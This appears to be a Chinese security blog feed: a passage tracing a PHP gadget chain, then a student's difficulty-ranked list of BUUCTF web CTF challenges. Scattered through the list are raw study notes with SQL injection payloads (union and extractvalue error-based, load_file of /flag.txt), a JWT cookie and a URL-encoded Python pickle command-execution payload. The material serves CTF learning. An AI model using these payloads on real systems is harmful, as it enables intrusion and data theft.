<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>

<p>首先跟进<code>getRelation</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>getAttr</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$notFound</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="variable">$notFound</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>getData</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/11/18/BUU%20WEB%E9%A2%98%E7%9B%AE%E6%95%B4%E5%90%88/</url>
    <content><![CDATA[<h1 id="BUU-WEB题目整合"><a href="#BUU-WEB题目整合" class="headerlink" title="BUU WEB题目整合"></a>BUU WEB题目整合</h1><p>目前截止于截止于2021年10月30日，本人是web狗，所以就只截取了web方向的题目，带有强烈的主观意识判断，只是为了方便学弟学习使用，其他师傅们仅供参考即可。</p>
<p>以主要考点为主来统计。重申一下，根据笔者是根据自己的水平进行归纳的（笔者也就是个普通的大三学生），所以带有很强烈的主观印象，仅供参考</p>
<ul>
<li>简单 当前中大型赛事中基本不会出现，一般是新生赛的题目，作为初学者学习的题目</li>
<li>签到  当前中大型赛事中作为签到出现，考点可能不会那么露骨，但是一般比赛中很多人都能做出来</li>
<li>中等 中大型赛事作为中等题目出现，一般会有20-30队伍解出</li>
<li>困难 作为困难题目出现，一般比赛中可能几个解甚至0解</li>
<li>脑洞 带有强烈主观印象！！！师傅们看看就好。</li>
</ul>
<p>笔者没有做过题目且没有找到WP的题目在最下面</p>
<h2 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><ul>
<li>[HCTF 2018] WarmUp 难度：简单 知识点：初步的代码审计和文件包含</li>
<li>[BJDCTF2020]Mark loves cat 简单的代码审计，变量覆盖</li>
</ul>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[HCTF 2018]admin 中等难度的题目，解法较多，分别有jwt伪造，条件竞争和unicode欺骗</li>
<li>[ZJCTF 2019]NiZhuanSiWe 基础的代码审计，解法较多，php伪协议</li>
<li>[BJDCTF2020]EasySearch 除了注入以外还会有Apache SSI 远程命令执行漏洞</li>
<li>[HarekazeCTF2019]encode_and_encode 编码绕过</li>
<li>[SUCTF 2019]EasyWeb 当年比较难的题目，现在这些考点被干碎了再出现就只能做签到了</li>
<li>[安洵杯 2019]不是文件上传 介乎于签到和中等之间，多个考点重合在一起了</li>
<li>[N1CTF 2018]eating_cms </li>
<li>[PASECA2019] honey_shop 读取环境变量，介乎于签到和中等之间</li>
<li>Phuck2</li>
<li>[网鼎杯 2020 总决赛]Game Exp</li>
<li></li>
</ul>
<h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[De1CTF 2019]SSRF Me Flask 字符串拼接带来的安全问题</li>
<li>[HFCTF2020]EasyLogin jwt伪造</li>
<li>[SCTF2019]Flag Shop ruby 代码审计</li>
<li>[DDCTF 2019]homebrew event loop 逻辑漏洞</li>
<li>[XDCTF 2015]filemanager </li>
<li>[PwnThyBytes 2019]Baby_SQL </li>
<li>[SWPUCTF 2016]Web blogsys 哈希拓展攻击，逻辑漏洞</li>
<li>[PWNHUB 公开赛 2018]傻 fufu 的工作日 加解密逻辑最好自己能够掌握。</li>
<li>[CISCN2019 东北赛区 Day2 Web3]Point System</li>
<li>[HBCTF2017]大美西安</li>
<li>[N1CTF 2018]easy_harder_php soap_ssrf 非常经典的题目</li>
<li>[Zer0pts2020]notepad python反序列化</li>
</ul>
<h3 id="困难"><a href="#困难" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[网鼎杯 2020 半决赛]faka  中等偏难</li>
<li>[RoarCTF 2019]PHPShe</li>
<li>[护网杯 2018]easy_laravel</li>
<li>[HMBCTF 2021]EzLight 红帽杯就3解还是几解我记得。</li>
<li>[HITCON 2017]Baby^h Master PHP  Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求</li>
<li>[CISCN2019 总决赛 Day2 Web2]Laravel File Manager 参考文章：<a href="https://blog.szfszf.top/article/39/">https://blog.szfszf.top/article/39/</a> 也是国赛经典不让人做</li>
<li>Real World CTF 2018 Bookhub</li>
</ul>
<p>​		</p>
<h3 id="脑洞"><a href="#脑洞" class="headerlink" title="脑洞"></a>脑洞</h3><ul>
<li>[羊城杯 2020]Blackcat 要听歌的WEB题目&#x3D;&#x3D; 2020🐏城杯的题目感觉..</li>
</ul>
<h2 id="SSTI："><a href="#SSTI：" class="headerlink" title="SSTI："></a>SSTI：</h2><h3 id="简单-1"><a href="#简单-1" class="headerlink" title="简单"></a>简单</h3><ul>
<li>[CSCCTF 2019 Qual]FlaskLight                                     1</li>
</ul>
<h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[BJDCTF2020]Cookie is so stable twig模板注入            2</li>
<li>[WesternCTF2018]shrine  想方设法获取config</li>
<li>[CISCN2019 华东南赛区]Web11 smarty模板注入       4</li>
<li>[BJDCTF2020]The mystery of ip  简单的flask注入       3</li>
<li>[GYCTF2020]FlaskApp debug模式一定条件下可以窃取出来pin码命令执行，但是题目过滤的不够严格导致可以直接打，比签到难一点</li>
<li>[pasecactf_2019]flask_ssti 编码绕过                               </li>
<li>[GWCTF 2019]你的名字</li>
<li>[CISCN2019 总决赛 Day1 Web3]Flask Message Board</li>
</ul>
<h3 id="中等-1"><a href="#中等-1" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[护网杯 2018]easy_tornado 因为框架比较冷门，如果不看WP的话需要自己手动翻手册，我觉得算中上偏难的题目。</li>
<li>[CISCN2019 华东南赛区]Double Secret 国赛半决赛因为大家互相出题所以都互相恶心，这题整个MD4，线下环境怎么打？</li>
<li></li>
</ul>
<h3 id="困难-1"><a href="#困难-1" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[QWB2021 Quals]托纳多</li>
</ul>
<h3 id="脑洞-1"><a href="#脑洞-1" class="headerlink" title="脑洞"></a>脑洞</h3><ul>
<li>[RootersCTF2019]I_&lt;3_Flask 用name注入。？怎么想到的</li>
</ul>
<h2 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h2><h3 id="简单-2"><a href="#简单-2" class="headerlink" title="简单"></a>简单</h3><ul>
<li>[极客大挑战 2019]LoveSQL 基础的注入题目*</li>
<li>[极客大挑战 2019]BabySQL 基础的注入题目2*</li>
<li>[极客大挑战 2019]HardSQL 报错注入以及需要绕过过滤3*</li>
<li>[GXYCTF2019]BabySQli union select 可以用于构造数据</li>
<li>[CISCN2019 华北赛区 Day2 Web1]Hack World 简单的盲注</li>
<li>[SWPU2019]Web1 &#x3D;题目难度取决于你有耐心去测字段数</li>
<li>[WUSTCTF2020]颜值成绩单 题目非常卡，应该是因为CDN的缘故&#x3D;。&#x3D;</li>
<li>[b01lers2020]Life on Mars</li>
<li>October 2019 Twice SQL Injection 简单题目</li>
<li>[RootersCTF2019]babyWeb</li>
</ul>
<h3 id="签到-2"><a href="#签到-2" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[极客大挑战 2019]FinalSQL</li>
<li>[CISCN2019 华北赛区 Day1 Web5]CyberPunk </li>
<li>[RCTF2015]EasySQL</li>
<li>[SUCTF 2019]EasySQL 堆叠注入题目，基础</li>
<li>[网鼎杯 2018]Comment hex对无法直接注入的内容加密一下</li>
<li>[GYCTF2020]Ezsqli 无列名注入</li>
<li>[NCTF2019]SQLi regexp</li>
<li>[网鼎杯2018]Unfinish hex</li>
<li>[RoarCTF 2019]Online Proxy</li>
<li>[SWPU2019]Web4 </li>
<li>[Black Watch 入群题]Web </li>
<li>[SUCTF 2018]MultiSQL</li>
<li>[BSidesCF 2019]Sequel 没有过滤的sqlite注入</li>
<li>[SWPU2019]Web6 <a href="https://www.cnblogs.com/20175211lyz/p/12285279.html#sql%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84with-rollup">with rollup</a>注入</li>
<li>[GWCTF 2019]blog 注入部分是签到难度的，后面会涉及到cbc翻转</li>
<li>1111111’ union select 1,database()</li>
<li>111’ and select 1,database()#</li>
</ul>
<p>-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() –+</p>
<p>1’ and extractvalue(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns WHERE table_schema &#x3D;database() and table_name&#x3D;’user’),32,31),0x7e))#</p>
<p>group_concat(column_name) FROM information_schema.columns WHERE table_schema &#x3D;’sqlilabs’ AND table_name&#x3D;’users’</p>
<p>1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables WHERE table_schema &#x3D;database()),0x7e))#</p>
<h3 id="中等-‘-user-id-address-old-address-user-name-phone’"><a href="#中等-‘-user-id-address-old-address-user-name-phone’" class="headerlink" title="中等 ‘~user_id,address,old_address,user_name,phone’"></a>中等 ‘~user_id,address,old_address,user_name,phone’</h3><p>1’ and extractvalue(1,concat(0x7e,mid((select load_file(‘&#x2F;flag.txt’)),32,31),0x7e))#</p>
<p>flag{c91d9ac1-ee93-4d48-95b5-d6f4a9100f57}</p>
<ul>
<li>[强网杯 2019]随便注 考点是堆叠注入</li>
<li>[GYCTF2020]Blacklist 堆叠注入</li>
<li>[网鼎杯 2018]Fakebook 有一点反序列化的内容</li>
<li>[CISCN2019 总决赛 Day2 Web1]Easyweb 预期解比较难，需要伪造admin的密钥</li>
<li>[PwnThyBytes 2019]Baby_SQL</li>
<li>2021祥云杯]Package Manager 2021 mongdb注入</li>
<li>[GKCTF 2021]hackme mongdb注入，不过这题难点不在这里</li>
<li>kzone unicode绕过</li>
<li>[SCTF 2018]ZhuanXV</li>
</ul>
<h3 id="困难-2"><a href="#困难-2" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[HarekazeCTF2019]Sqlite Voting 中等偏难，sqlite注入</li>
<li>[De1CTF 2019]Giftbox 这题没有做过，</li>
<li>[Black Watch 入群题]Web2 sql注入部分不给hint真的很难想得到</li>
<li>[D3CTF 2019]Showhub insert on duplicate key update 注入</li>
<li>[hitcon2017] Sql-so-hard 复现  max_allowed_packet</li>
</ul>
<h2 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h2><h3 id="简单-3"><a href="#简单-3" class="headerlink" title="简单"></a>简单</h3><ul>
<li>[极客大挑战 2019]Upload 基础的文件上传，php5环境可以利用script绕过标签限制</li>
<li>[ACTF2020 新生赛]Upload 基础的文件上传</li>
<li>[MRCTF2020]你传你🐎呢 基础的文件上传绕过</li>
<li>[GXYCTF2019]BabyUpload 基础的文件上传绕过</li>
</ul>
<h3 id="签到-3"><a href="#签到-3" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[WUSTCTF2020]CV Maker </li>
<li>[RoarCTF 2019]Simple Upload </li>
<li>[HarekazeCTF2019]Avatar Uploader 2</li>
</ul>
<h3 id="中等-2"><a href="#中等-2" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[SUCTF 2019]CheckIn .user.ini 除此之外还需要尝试绕过函数check</li>
<li>[XNUCA2019Qualifier]EasyPHP</li>
<li>[SWPU2019]Web3 jwt伪造+zip下载</li>
<li>[FireshellCTF2020]ScreenShoot</li>
<li>[JMCTF 2021]GoOSS 盲注解法很有意思&#x3D;。&#x3D;！</li>
</ul>
<h3 id="困难-3"><a href="#困难-3" class="headerlink" title="困难"></a>困难</h3><ul>
<li>2019 0CTF&#x2F;TCTF wallbreaker easy 恶意so文件上传</li>
<li>[QWB2021 Quals]托纳多</li>
<li>l33t-hoster</li>
<li>[BBCTF2020]imgaccess2</li>
</ul>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>纯文件包含很难出的很难</p>
<h3 id="简单-4"><a href="#简单-4" class="headerlink" title="简单"></a>简单</h3><ul>
<li>[极客大挑战 2019]Secret 基础题目。</li>
<li>[RoarCTF 2019]Easy Java java题目&#x3D;。&#x3D;</li>
<li>[BSidesCF 2020]Had a bad day 文件包含</li>
</ul>
<h3 id="签到："><a href="#签到：" class="headerlink" title="签到："></a>签到：</h3><ul>
<li><p>[SUCTF 2019]Pythonginx 该题为一个<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">tricks</a>,其中有关于python的字符的安全问题，除此之外还有第二种解法</p>
</li>
<li><p>[NPUCTF2020]ezinclude 临时文件包含zuo</p>
</li>
<li></li>
<li><table>
<thead>
<tr>
<th>[<a href="https://www.nssctf.cn/problem/2900">HNCTF 2022 Week1]Interesting_include</a></th>
<th>Web文件包含</th>
<th>179</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>2948</td>
<td>[<a href="https://www.nssctf.cn/problem/2948">HNCTF 2022 WEEK2]easy_include</a></td>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p><a href="https://blog.zeddyu.info/2022/01/08/2022-01-08-TheEndOfLFI/#rce">https://blog.zeddyu.info/2022/01/08/2022-01-08-TheEndOfLFI/#rce</a></p>
</li>
<li><p><a href="https://buuoj.cn/match/matches/166/challenges#BlogSystem">BUUCTF在线评测 (buuoj.cn)</a></p>
</li>
<li></li>
<li><p>[FireshellCTF2020]Caas C语言</p>
</li>
</ul>
<h3 id="中等-3"><a href="#中等-3" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[WMCTF2020]Make PHP Great Again</li>
<li>[CISCN2021 Quals]upload 当时真的好难，主要是国赛这次这个题目只给做几个小时，不然感觉很多人是可以做出来的</li>
<li></li>
</ul>
<h3 id="困难-4"><a href="#困难-4" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[WMCTF2020]Web Check in 2.0</li>
<li>[WMCTF2020]Web Check in 一个题目，这个有非预期</li>
<li>[CISCN2021 Quals]filter yii2 laravel LFI 的CVE改的</li>
</ul>
<p>#!(@&amp;,!’^@@`@@@@</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="简单-5"><a href="#简单-5" class="headerlink" title="简单"></a>简单</h3><ul>
<li>ACTF2020 新生赛]Exec 基础的命令执行</li>
<li>[BUUCTF]Easybypass 很少的过滤</li>
</ul>
<h3 id="签到-4"><a href="#签到-4" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[GXYCTF2019]Ping Ping </li>
<li>[BUUCTF 2018]Online Tool escapeshellarg()和escapeshellcmd() 在一起会有问题。</li>
<li>[网鼎杯 2020 朱雀组]Nmap 和上题一样的考点</li>
<li>[极客大挑战 2019]RCE ME 无字母getshell，同时进行disable_function绕过</li>
<li>[FBCTF2019]RCEService 正则字符串回溯绕过</li>
<li>[红明谷CTF 2021]write_shell </li>
<li>[羊城杯2020]easyphp</li>
<li>[RCTF 2019]Nextphp</li>
<li>CSAWQual 2016]i_got_id</li>
</ul>
<h3 id="中等-4"><a href="#中等-4" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[GYCTF2020]EasyThinking  thinkphp6.0 任意文件操作</li>
</ul>
<h3 id="困难-5"><a href="#困难-5" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[蓝帽杯 2021]One Pointer PHP suid提前，fsockopen绕过，（据说原本是个webpwn？</li>
<li>[N1CTF2020]DockerManager </li>
<li>[羊城杯 2020]Break The Wall webpwn？</li>
<li>HITCON 2015 BabyFirst  orange的这种极限绕过的题都觉得眼界大开</li>
<li>[HITCON 2017]Babyfirst-Revenge</li>
<li>[HITCON 2017]Babyfirst-Revenge-V2</li>
<li>[CISCN2019 总决赛 Day1 Web5]Markdown Note 恶心人的题目，带了逆向，也是现场不想让你做的题目</li>
</ul>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="简单-6"><a href="#简单-6" class="headerlink" title="简单"></a>简单</h3><ul>
<li>[极客大挑战 2019]Knife 蚁剑</li>
<li>[SUCTF 2018]GetShell 无字母getshell</li>
</ul>
<h3 id="签到-5"><a href="#签到-5" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[GXYCTF2019]禁止套娃 过滤绕过。</li>
<li>[安洵杯 2019]easy_web</li>
<li>[HITCON 2017]SSRFme perl脚本漏洞</li>
<li>[SUCTF 2018]GetShell 无字母getshell</li>
<li>[ISITDTU 2019]EasyPHP 命令执行取反，绕过</li>
</ul>
<h3 id="中等-5"><a href="#中等-5" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[RoarCTF 2019]Easy Calc 利用字符串解析差异，但是我觉得这样解释有点过于脑洞，可能题目出的时候是有hint的，直接猜想是很难猜想出来的。所以这道题的出题人考点可能在于http走私</li>
<li>[BJDCTF2020]EzPHP 恶心的一批，大杂烩了属于是</li>
<li>[HFCTF2020]JustEscape  又有PHP又有JS，VM2沙箱逃逸</li>
<li>[De1CTF 2019]ShellShellShell</li>
<li>[D3CTF 2019]EasyWeb</li>
</ul>
<h3 id="困难-6"><a href="#困难-6" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[CISCN 2019 初赛]Love Math 经典题目了，这个题目作为第一次出现的话真的很难，建议看<a href="https://www.bilibili.com/video/BV1pE411f7DN?spm_id_from=333.999.0.0">赵总视频学习</a></li>
<li>[NESTCTF 2019]Love Math 2 上面那道题目的加强版本</li>
<li>ctf473831530_2018_web_virink_web fpm未授权访问和rsync</li>
</ul>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="简单-7"><a href="#简单-7" class="headerlink" title="简单"></a>简单</h3><ul>
<li><p>[极客大挑战 2019]PHP 反序列化，wakeup绕过</p>
</li>
<li><p>[MRCTF2020]Ezpop 简单的pop</p>
</li>
<li><p>[NPUCTF2020]ReadlezPHP 动态函数</p>
</li>
<li><p>[EIS 2019]EzPOP</p>
</li>
</ul>
<h3 id="签到-6"><a href="#签到-6" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[网鼎杯 2020 青龙组]AreUSerialz 反序列化，弱类型比较  1.</li>
<li>[网鼎杯 2020 朱雀组]phpweb 简单的反序列化命令执行     2.</li>
<li>[安洵杯 2019]easy_serialize_php 反序列化逃逸    </li>
<li>[SWPUCTF 2018]SimplePHP phar反序列化  3.</li>
<li>[CISCN2019 华北赛区 Day1 Web1]Dropbox  phar反序列化  </li>
<li>[GXYCTF2019]BabysqliV3.0 </li>
<li>[2020 新春红包题] </li>
<li>[极客大挑战 2020]Greatphp 原生类的利用</li>
<li>[watevrCTF-2019]Pickle Store python 反序列化</li>
<li>[SUCTF 2019]Upload Labs2 原生类反序列化</li>
<li>[网鼎杯 2020 总决赛]Game Exp</li>
</ul>
<h3 id="中等-6"><a href="#中等-6" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[0CTF 2016]piapiapia 重量级，这题居然是16年的题目，放到现在感觉也不算特别简单的题目，介乎中等之间</li>
<li>[CISCN2019 华北赛区 Day1 Web2]ikun python反序列化，jwt伪造</li>
<li>[强网杯 2019]Upload 反序列化</li>
<li>bestphp’s revenge 反序列化引擎带来的问题</li>
<li>[HarekazeCTF2019]Easy Notes 和上面一道题是一个考点</li>
<li>[HFCTF 2021 Final]easyflask python 反序列化</li>
<li>[MRCTF2020]Ezpop_Revenge 简单的POP 打SSRF</li>
<li>[红明谷CTF 2021]EasyTP thinkphp3反序列化读取任意文件</li>
<li>[D3CTF 2019]EzUpload</li>
<li>_ga&#x3D;GA1.1.848093604.1673001074; _ga_P7C4RLLHKT&#x3D;GS1.1.1673001073.1.1.1673002587.0.0.0; _xsrf&#x3D;2|093413a4|9b698e49320eca48d63d7e012491c6a0|1679120502; JWT&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q; commodity_id&#x3D;”2|1:0|10:1679124024|12:commodity_id|8:MTYyNA&#x3D;&#x3D;|aae2e78dcb8be9515838c258e387f8f6f777a8f949d03d9d0c11d4a6390d39e9”</li>
<li>ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20&#x2F;flag.txt%20&#x2F;%27%0Ap1%0Atp2%0ARp3%0A.</li>
</ul>
<h3 id="困难-7"><a href="#困难-7" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[CISCN2019 总决赛 Day1 Web4]Laravel1 当时应该是0day出题，纯自己做也是比较麻烦的</li>
<li>[安洵杯 2019]iamthinking 1day出的题，纯自己挖反序列化也是困难的、</li>
<li>[NCTF2019]phar matches everything phar反序列化漏洞+SSRF漏洞+PHP-FPM未授权访问漏洞。</li>
<li>[RoarCTF 2019]PHPShe</li>
<li>虎符2021线下 tinypng 这道题很有意思，绕过姿势很多，需要详细做</li>
</ul>
<h3 id="脑洞-2"><a href="#脑洞-2" class="headerlink" title="脑洞"></a>脑洞</h3><ul>
<li>[羊城杯 2020]EasySer</li>
</ul>
<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><h3 id="简单-8"><a href="#简单-8" class="headerlink" title="简单"></a>简单</h3><h3 id="签到-7"><a href="#签到-7" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[GXYCTF2019]StrongestMin</li>
</ul>
<h3 id="中等-7"><a href="#中等-7" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[强网杯 2019]高明的黑客 </li>
<li>[BSidesCF 2020]Cards</li>
<li>[b01lers2020] Scrambled</li>
</ul>
<h3 id="困难-8"><a href="#困难-8" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[QWB2021 Quals]popmaster</li>
</ul>
<h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><h3 id="简单-9"><a href="#简单-9" class="headerlink" title="简单"></a>简单</h3><p>+ </p>
<h3 id="签到-8"><a href="#签到-8" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[NPUCTF2020]验证🐎 稍等比签到难</li>
</ul>
<h3 id="中等-8"><a href="#中等-8" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[GYCTF2020]Ez_Express 介乎于签到和中等之间，主要是这里的原型链污染出现过了所以不会算难</li>
<li>[GYCTF2020]Node Game node8 unicode编码问题导致的CRLF</li>
<li>[2021祥云杯]secrets_of_admin 代码逻辑问题</li>
<li>[网鼎杯 2020 半决赛]BabyJS </li>
<li>[2021祥云杯]cralwer_z</li>
<li>[XNUCA2019Qualifier]HardJ 当年很难，但是在2021年ejs原型链污染这个大家都会了</li>
<li>[RootersCTF2019]notifyxapi</li>
<li>[GKCTF 2021]easynode 我出的垃圾题目</li>
</ul>
<h3 id="困难-9"><a href="#困难-9" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[HITCON 2016]Leaking node沙箱逃逸（纯自己做的话就很难了，不过exp现在满天飞了</li>
<li>[RCTF2019]calcalcalc </li>
<li>[De1CTF 2019]9calc</li>
<li>[STARCTF2019]996game</li>
</ul>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="简单-10"><a href="#简单-10" class="headerlink" title="简单"></a>简单</h3><ul>
<li>[NCTF2019]Fake XML cookbook 最基础的XXE</li>
</ul>
<h3 id="签到-9"><a href="#签到-9" class="headerlink" title="签到"></a>签到</h3><ul>
<li><p>[NCTF2019]True XML cookbook 利用xxe做内网探测</p>
</li>
<li><p>[CSAWQual 2019]Web_Unagi utf编码绕过</p>
</li>
<li><p>[BSidesCF 2019]SVGMagic svg图片xxe</p>
</li>
<li><p>[NPUCTF2020]ezlogin xpath注入</p>
</li>
<li><p>[FireshellCTF2020]Cars</p>
</li>
</ul>
<h3 id="中等-9"><a href="#中等-9" class="headerlink" title="中等"></a>中等</h3><ul>
<li>[GoogleCTF2019 Quals]Bnv-XXE学习记录 现在不算了&#x3D;。&#x3D;</li>
<li>[SUCTF 2018]Homework</li>
</ul>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="简单-11"><a href="#简单-11" class="headerlink" title="简单"></a>简单</h3><p>+ </p>
<h3 id="签到-10"><a href="#签到-10" class="headerlink" title="签到"></a>签到</h3><ul>
<li>[GWCTF 2019]mypassword</li>
<li>[GKCTF 2021]CheckBot GKCTF0解题目，难度不用我多说了吧 考的是个tricks</li>
</ul>
<h3 id="中等-10"><a href="#中等-10" class="headerlink" title="中等"></a>中等</h3><ul>
<li><p>[CISCN2019 华东北赛区]Web2</p>
</li>
<li><p>[网鼎杯 2020 青龙组]notes</p>
</li>
<li><p>[Zer0pts2020]musicblog</p>
</li>
<li><p>[安洵杯 2019]cssgame xs-lerk 通过css的正则带出flag</p>
</li>
<li><p>math-is-fun1 css外带</p>
</li>
</ul>
<h3 id="困难-10"><a href="#困难-10" class="headerlink" title="困难"></a>困难</h3><ul>
<li>[SCTF2019]Math-IS-Fun-2 上面那道题的加强版？实际上没有反看到WP</li>
<li>[QWB2021 Quals]HardXSS hardxxe【</li>
</ul>
